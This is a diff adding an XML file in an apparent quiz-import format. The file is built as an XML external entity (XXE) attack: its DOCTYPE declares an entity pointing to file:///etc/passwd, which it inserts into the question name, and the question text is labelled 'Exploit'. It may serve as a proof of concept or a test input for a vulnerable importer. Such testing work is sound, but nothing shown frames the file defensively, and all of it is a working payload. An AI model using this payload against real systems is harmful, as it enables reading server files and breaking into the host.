@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<quiz>
+  <question type="shortanswer">
+    <name><text>&xxe;</text></name>
+    <questiontext><text>Exploit</text></questiontext>
+    <answer fraction="100"><text>test</text></answer>
+  </question>
+</quiz>
